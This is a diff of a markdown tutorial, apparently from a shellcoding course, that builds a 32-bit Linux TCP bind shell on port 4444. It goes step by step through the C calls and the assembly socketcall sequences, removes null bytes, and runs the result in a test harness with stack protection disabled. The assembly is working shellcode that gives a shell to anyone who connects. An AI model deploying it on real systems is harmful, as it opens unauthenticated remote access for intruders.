@@ -18,26 +18,25 @@ In order to easily translate the calls in to assembly, lets build the Bind Shell
 ## Creating a Bind Shell in C
 
 ### Creating the socket
-man socket gives details about the call to socket:
+Details about the function are in the man page:
 ```c
 int socket(int domain, int type, int protocol);
 ```
-The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>
+The argument "int domain" specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>
 
-We will need IPv4 for our domain
+We will use IPv4 for our domain
 > AF_INET             IPv4 Internet protocols
 
-To identify what we need to represent this family, we can look in:
+The constant I will use to specify IPv4 is in:
 ```c 
 cat /usr/include/i386-linux-gnu/bits/socket.h | grep _INET
 
 #define PF_INET	2	/* IP protocol family. */
 ```
-
-The next argument is type, which specifies the communication semantics.  We will be using:
+The next argument is type, I will be using:
 > SOCK_STREAM
 
-In order to see what int we will provide for the argument we can look in:
+Again we will need to identify the constant for SOCK_STREAM and it's value to use for the call, that can be found in:
 ```c
 cat /usr/src/linux-headers-4.15.0-43/include/linux/net.h | grep SOCK_STREAN
 
@@ -46,20 +45,19 @@ cat /usr/src/linux-headers-4.15.0-43/include/linux/net.h | grep SOCK_STREAN
 ```
 The last argument is protocol, we can pass a 0 in to this argument.
 
-As of right now our call will be:
+As of right now the call will be:
 ```c
 int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 // using the integers, it is:
 socket(2, 1, 0);
 ```
 ### Bind the socket to an IP and port
-After the socket is created, we will need to call bind to bind the socket to a port.
-
+After the socket is created, we will need to call the function bind so that our socket binds to the port that we want.
 ```c
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
-The first argument will be sockfd which comes from the socket we just created above.
-The addr parameter will need the sockaddr_in struct, which will include address, port number, and family (AF_INET which was selected earlier for the socket)
+The first argument will be sockfd which comes from the return value of the socket that was just created above.
+The addr parameter will need the sockaddr_in struct, which will include address, port number, and family.
 ```c
 struct sockaddr_in {
     sa_family_t    sin_family; /* address family: AF_INET */
@@ -82,7 +80,7 @@ sock_addr.sin_addr.s_addr = INADDR_ANY;
 
 bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
 ```
-Converting these values from their constants - 
+Converting these values from their constants--
 We know AF_INET is 2.
 INADDR_ANY is 0x00000000 (0.0.0.0) and can be found here:
 ```c
@@ -91,7 +89,7 @@ cat /usr/include/netinet/net.h | grep INADDR_ANY
 #define INADDR_ANY ((in_addr_t) 0x00000000)
 ```
 ### Set the socket to listen
-The next step is to call the listen function to begin listening on the bound socket.
+The next step is to call the listen function so that our socket is ready for any incoming connection attempts.
 ```c
 int listen(int sockfd, int backlog);
 ```
@@ -106,7 +104,7 @@ Now that our socket is listening, we can start the process to accept a connectio
 ```c
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 ```
-This is also fairly straight forward.  We can use our socket created in step 1 for the first parameter, and just put NULL for the last 2. 
+This is also fairly straight forward.  We can use the socket created in step 1 for the first parameter, and just put NULL for the last 2. 
 Note that this function's return value is important to us here.  We will need the return value in order to keep track of the client connection's file descriptor:
 > On success, these system calls return a nonnegative integer that is a file descriptor for the accepted socket.
 
@@ -119,9 +117,9 @@ In order to get input and send output, we need to redirect stdin, stdout, and st
 ```c
 int dup2(int oldfd, int newfd);
 ```
-oldfd will be the client_socket that we accepted and newfd will refer to the integers that represet stdin (0), stdout (1), stderr (2).
+oldfd will be the client_socket that we accepted and newfd will refer to the integers that represent stdin (0), stdout (1), stderr (2).
 
-Our code will be:
+Our calls will be:
 ```c
 dup2(client_socket, 0);
 dup2(client_socket, 1);
@@ -186,11 +184,18 @@ A quick reminder of arguments and calls for assembly:
 
 ### 1 Creating the socket
 
-Sockets are handled through socketcall()\
+Sockets are handled through socketcall()
+
 http://man7.org/linux/man-pages/man2/socketcall.2.html
 ```c
 int socketcall(int call, unsigned long *args);
 ```
+This means that we will have EAX be our socketcall value (0x66).
+
+EBX will be the call related to socket (bind, listen, accept, etc.)
+
+ECX will be a struct with the args to be passed in to our call.
+
 The call ids can be found at:
 ```c 
 cat /usr/include/linux/net.h | grep SYS_
@@ -201,11 +206,15 @@ cat /usr/include/linux/net.h | grep SYS_
 #define SYS_LISTEN	 4		/* sys_listen(2)		*/
 #define SYS_ACCEPT	 5		/* sys_accept(2)		*/
 ``` 
-Looking at our C code, we need to call socket(2, 1, 0);\
-This will translate to:\
-    EAX - 0x66 for socketcall\
-    EBX - 1 fo socket\
-    ECX - address on stack with args 2, 1 0\
+Looking at our C code, we need to call socket(2, 1, 0);
+
+This will translate to:
+
+    EAX - 0x66 for socketcall
+    
+    EBX - 1 for socket
+    
+    ECX - address on stack with args 2, 1 0
 ```asm
 ; clear registers while avoiding nulls
 xor eax, eax
@@ -218,7 +227,7 @@ mov al, 0x66
 ;0x1 for socket
 mov bl, 0x1
 ```
-Setting up ECX - our *args parameter - we can use the stack to push the values then make ecx the stack pointer so that we have the address for the args.  Note that when using the stack for args in this way, we have to push them in the reverse order due to the way the stack works (FILO).
+Setting up ECX - our *args parameter - we can use the stack to push the values, then make ecx equal to the stack pointer (esp) so that we have the address for the args stored in ecx.  Note that when using the stack for args in this way, we have to push them in the reverse order since the stack grows down (towards 0).
 ```asm
 ; ecx = 0
 push ecx
@@ -230,23 +239,30 @@ push 0x2
 mov ecx, esp
 int 0x80
 ```
-Return value will be sockfd stored in EAX.  Since EAX is used for our socketcall argument, we need to move it to a register for safe keeping which will be edi.
+The return value will be sockfd that is stored in EAX.  Since EAX is used for our socketcall argument, we need to move it to a register for safe keeping.  I have decided to use edi.
 ```asm
 mov edi, eax
 ```
 ### 2 Bind the socket to an IP and port
-Now that we have the sockfd, it's time to bind the socket.\
-\
-As we created earlier, our reference is:\
-bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));\
-Just for my own understanding, I'll write out the socketcall format with any structs or objects in {}.\
-socketcall( SYS_BIND, {sockfd, {AF_INET, 4444, INADDR_ANY}, 0x10} );\
-EAX - 0x66\
-EBX - 0x2\
-ECX - pointing to stack:\
-STACK: edi, point to struct, 0x10, struct{0x2, 0x115C, 0x00000000}\
-\
-Lets build this in assembly now:
+Now that we have sockfd, it's time to bind the socket.
+
+As we created earlier, our reference is:
+
+bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
+
+Just for my own understanding, I'll write out the socketcall format with any structs or objects in {}.
+
+socketcall( SYS_BIND, {sockfd, {AF_INET, 4444, INADDR_ANY}, 0x10} );
+
+EAX - 0x66 - socketcall
+
+EBX - 0x2 - SYS_BIND
+
+ECX - pointing to stack:
+
+STACK: edi (sockfd), point to struct, 0x10, struct{0x2, 0x115C, 0x00000000}
+
+Let's build this in assembly now:
 ```asm
 mov al, 0x66
 inc ebx      ; previously set to 0x1 -> increase it to 2
@@ -268,13 +284,18 @@ mov ecx, esp
 int 0x80
 ```
 ### 3 Set the socket to listen
-Next step is to call listen(sockfd, 0);\
+The next step is to call listen(sockfd, 0);
+
 This will translate to:
-EAX - 0x66\
-EBX - 0x4\
-ECX - pointing to stack:\
-STACK: edi, 0x0\
-\
+
+EAX - 0x66 - socketcall
+
+EBX - 0x4 - SYS_LISTEN
+
+ECX - pointing to stack:
+
+STACK: edi, 0x0
+
 Note that on success, bind returns 0x0 into eax which we can now use for our args on the stack as well as sockfd.
 ```asm
 ; stack setup
@@ -292,12 +313,17 @@ int 0x80
 ```
 ### 4 Accept a connection
 Next step is to call accept(sockfd, NULL, NULL);
-This translates to:\
-EAX - 0x66\
-EBX - 0x5\
-ECX - pointing to stack:\
-STACK: edi, 0x0, 0x0\
-\
+
+This translates to:
+
+EAX - 0x66 - socketcall
+
+EBX - 0x5 - SYS_ACCEPT
+
+ECX - pointing to stack:
+
+STACK: edi, 0x0, 0x0
+
 Note that on success, listen returns 0x0 into eax (same as above).
 ```asm
 ; stack setup
@@ -315,22 +341,33 @@ int 0x80
 ```
 ### 5 Redirect output
 Now that we have accepted the connection, we need to redirect in, out, & err.
-The return value for accept is the descriptor for the client connection, which will be used as an argument for dup2 in ebx.  We can just move this from eax to ebx first.\
-dup2(client_socket, 0);\
-dup2(client_socket, 1);\
-dup2(client_socket, 2);\
-This translates to:\
-EAX - 0x3f\
-EBX - return value from accept\
+The return value for accept is the descriptor for the client connection, which will be used as an argument for dup2 in EBX.  We can just move this from EAX to EBX first.
+
+dup2(client_socket, 0);
+
+dup2(client_socket, 1);
+
+dup2(client_socket, 2);
+
+This translates to:
+
+EAX - 0x3f - dup
+
+EBX - return value from accept
+
 ECX - integer 2, 1, or 0
-Since this is the same call 3 times and the only difference is an increasing (*hint* or decreasing) int.. this looks like a loop would be best to use here.\
+
+Since this is the same call 3 times and the only difference is an increasing (*hint* or decreasing) int.. this looks like a loop would be best to use here.
+
 Luckily, our loop only needs to decrease from 2.  ECX can be used as the counter AND the argument, which helps us out a lot here.
 
 Grab the syscall number for dup2:
 ```c
-cat /usr/
+cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
+#define __NR_dup2 63
 ```
-There is a conditional jump in assembly called jns which means, as I understand it, "Jump No Sign".  Which will take the jump until the Sign Flag is set.  Easier description.. Take the jump until the value becomes negative.\
+There is a conditional jump in assembly called jns which means, as I understand it, "Jump No Sign".  Which will take the jump until the Sign Flag is set.  As an easier description.. Take the jump until the value becomes negative.
+
 This conditional jump is perfect for us because it will include 0 in our loop before exiting.
 ```asm
         mov ebx, eax    ; client_socket arg
@@ -343,11 +380,16 @@ dup:
         jns dup
 ```
 ### 6 Execute a shell
-Now we just need to execute /bin/sh with execve to give the client the shell.\
-The call will be:\
-execve("/bin/sh", NULL, NULL);\
-We have to null terminate the string for "/bin/sh" so we will use the stack to assign it to the proper register.\
-EDX is still 0'd out so we can keep it the same and also use it to make ECX 0.
+Now we just need to execute /bin/sh with execve to give the client the shell.
+
+The call will be:
+
+execve("/bin/sh", NULL, NULL);
+
+We have to null terminate the string for "/bin/sh" so we will use the stack to assign it to the proper register.
+
+EDX is still 0'd out so we can keep it the same for an argument and also use it to null terminate ECX.
+
 Note that, for ease of writing, we want 8 characters for our string.  We can do "/bin//sh" to effectively give the same command and have the proper length.  We also want to reverse the string, split it in to 4 character sections and push it on to the stack in hex.
 ```asm
 push edx  ; null terminate the string
@@ -492,7 +534,8 @@ dup:
         int 0x80            ; execve("/bin//sh", NULL, NULL)
 ```
 Compile it:
-> nasm -f elf32 -o bind_shell.o bind_shell.nasm\
+> nasm -f elf32 -o bind_shell.o bind_shell.nasm
+
 > ld -z execstack -o bind_shell bind_shell.o
 
 Let's check this for null bytes:
@@ -587,7 +630,8 @@ Compile.:
 ```shell
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 ```
-Now it should work!\
+Now it should work!
+
 Run the file:
 ```shell
 ./shellcode
